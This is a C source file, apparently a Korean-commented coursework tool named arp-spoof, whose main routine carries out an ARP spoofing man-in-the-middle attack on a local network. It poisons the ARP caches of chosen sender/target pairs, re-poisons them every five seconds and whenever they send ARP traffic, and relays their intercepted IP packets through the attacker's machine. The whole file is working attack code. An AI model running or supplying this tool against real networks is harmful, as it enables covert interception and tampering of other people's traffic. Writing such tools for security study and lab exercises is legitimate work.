#include "send-arp.h"
#include "arp-spoof.h"
#include <pcap.h>
#include <stdio.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

void usage() {
    printf("syntax: arp-spoof <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

int main(int argc, char* argv[]) {
    if (argc < 4 || argc % 2 != 0) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];

    // get attacker ip, mac
    uint32_t my_ip;
    Mac my_mac;

    if (get_my_ip(dev, &my_ip) == false) return -1;
    if (get_my_mac(dev, &my_mac) == false) return -1;

    // open handle
    pcap_t* handle = pcap_open_live(dev, 65536, 1, 1000, errbuf); // 점보 패킷
        if (handle == NULL) {
            printf("couldn't open device %s(%s)\n", dev, errbuf);
            return -1;
        }

    FlowNode* head = NULL;
    FlowNode* tail = NULL;

    for (int i = 1; i < (argc / 2); i++) {
        char* sender = argv[2 * i];
        char* target = argv[2 * i + 1];

        uint32_t sender_ip;
        uint32_t target_ip;

        Flow flow;
        memset(&flow, 0, sizeof(flow));

        // get sender, target ip
        if (inet_pton(AF_INET, sender, &sender_ip) != 1) {
            printf("wrong sender ip: %s\n", sender);
            continue;
        }                                                  

        if (inet_pton(AF_INET, target, &target_ip) != 1) {
            printf("wrong target ip: %s\n", target);
            continue;
        }
        flow.sender_ip = ntohl(sender_ip);
        flow.target_ip = ntohl(target_ip);

        // get sender, target mac
        if (get_mac(handle, my_ip, &my_mac, flow.sender_ip, &flow.sender_mac) == false) {
            printf("couldn't get sender mac: %s\n", sender);
            continue;
        }

        if (get_mac(handle, my_ip, &my_mac, flow.target_ip, &flow.target_mac) == false) {
            printf("couldn't get target mac: %s\n", target);
            continue;
        }

        // linkedlist에 저장
        FlowNode* node = create_node(&flow);
        if (node == NULL) {
            printf("memory allocation failed\n");
            free_list(head);
            pcap_close(handle);
            return -1;
        }
        append_node(&head, &tail, node);
    }
    
    // send attack
    send_attack_flow(handle, &my_mac, head);

    // relay, re-infect
    time_t last_time = time(NULL);
    while (1) {
        // 주기적 전송
        time_t current_time = time(NULL); 
        if (current_time - last_time >= 5) { 
            send_attack_flow(handle, &my_mac, head);
            last_time = current_time;
        }
	
        struct pcap_pkthdr* header;
        const u_char* packet;
        u_char relay_packet[65536];
        
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue; 
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex error %d(%s)\n", res, pcap_geterr(handle));
            break; 
        }

        if (header->caplen < sizeof(Eth_hdr)) continue;

        Eth_hdr* eth = (Eth_hdr*)packet;
        uint16_t eth_type = ntohs(eth->type);

        // relay
        if (eth_type == ETHTYPE_IP) {
            Ipv4_hdr* ip = (Ipv4_hdr*)(packet + sizeof(Eth_hdr));
            if (ntohl(ip->dip) == my_ip) continue; // 원래 내 ip로 오는거였다면
            if (memcmp(eth->dmac.mac, my_mac.mac, 6) != 0) continue;  // 내 mac으로 오는게 아니라면
            
            FlowNode* cur = head;
            while(cur != NULL){
                if(memcmp(eth->smac.mac, cur->flow.sender_mac.mac, 6) == 0){
                    memcpy(relay_packet, packet, header->caplen);
                    eth = (Eth_hdr*) relay_packet;
                    memcpy(eth->smac.mac, my_mac.mac, 6);
                    memcpy(eth->dmac.mac, cur->flow.target_mac.mac, 6);
                    int res = pcap_sendpacket(handle, relay_packet, header->caplen);
                    if (res != 0) {
                        printf("Relay failed\n");
                    }
                    break;
                }
                cur = cur->next;
            }
        }
        // 재감염(Re-infect)
        else if (eth_type == ETHTYPE_ARP) {
            Arp_hdr* arp = (Arp_hdr*)(packet + sizeof(Eth_hdr));
            if (memcmp(eth->smac.mac, my_mac.mac, 6) == 0) continue; 

            uint32_t arp_sip = ntohl(arp->sip);
            uint32_t arp_tip = ntohl(arp->tip);

            FlowNode* cur = head;
            while (cur != NULL) {
                if (arp_sip == cur->flow.sender_ip || arp_sip == cur->flow.target_ip) { 
                    send_attack(handle, &my_mac, &cur->flow);
                }
                cur = cur->next;
            }
        }
    }

    free_list(head);
    pcap_close(handle);

    return 0;
}
